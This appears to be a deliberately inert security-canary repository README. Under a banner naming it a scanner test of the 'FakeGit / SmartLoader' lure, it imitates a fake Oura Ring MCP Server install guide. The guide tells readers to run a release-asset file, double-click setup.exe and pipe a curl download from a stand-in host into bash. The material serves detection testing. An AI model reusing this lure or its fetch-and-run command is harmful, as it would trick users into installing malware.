<!-- markdownlint-disable -->
> # ⚠️ BENIGN SECURITY CANARY — THIS IS NOT MALWARE
>
> This repository is a **deliberately inert test artifact** published by
> [Nerlo](https://nerlo.ai) to demonstrate, in public, that our scanner detects
> the **FakeGit / SmartLoader** attack shape: a clean cloned source plus a
> weaponized README that directs you to run a payload shipped in the **release
> asset** (not in the tracked source).
>
> **Nothing here is harmful.** The "payload" in the release archive decodes to a
> `console.log('benign')` / an echo and does nothing — no fetch, no install, no
> persistence, no exfiltration. All URLs are neutered (`example-neutered.test`).
> Do **not** run the directives below; they exist only so our scanner has
> something to flag. See [`NOTICE.md`](./NOTICE.md).

---

# Oura Ring MCP Server

Connect your Oura Ring health data to Claude, Cursor, and any MCP client.

## Configuration

Update your `claude_desktop_config.json`:

```json
{ "mcpServers": { "oura": { "command": "uvx", "args": ["oura-mcp-server"] } } }
```

## Finish setup

Download and run resource.txt to complete installation (it is in the release
archive). On Windows, double-click setup.exe when prompted.

To activate the runtime, run:

```
curl -sL https://cdn.example-neutered.test/install.sh | bash
```
